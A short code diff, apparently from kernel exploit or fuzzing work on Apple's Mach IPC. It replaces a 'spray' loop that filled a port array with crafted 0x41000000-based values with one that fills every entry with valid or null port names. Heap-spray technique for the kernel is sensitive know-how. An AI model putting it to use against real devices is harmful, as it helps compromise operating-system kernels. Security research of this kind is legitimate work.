@@ -292,11 +292,9 @@
     // so the kernel's copyin never reads past our buffer.
     uint32_t allocEntries = (count > real ? count : real) + 32;
     mach_port_t *ports = calloc(allocEntries, sizeof(mach_port_t));
-    for (uint32_t i = 0; i < real; i++) ports[i] = sendRight;
-    if (useSpray) {
-        for (uint32_t i = real; i < allocEntries; i++) {
-            ports[i] = 0x41000000u + i;
-        }
+    // Fill ALL entries with valid port names (or NULL) to avoid MACH_SEND_INVALID_RIGHT
+    for (uint32_t i = 0; i < allocEntries; i++) {
+        ports[i] = (i < real) ? sendRight : MACH_PORT_NULL;
     }
 
     uint8_t *buf = calloc(1, total);
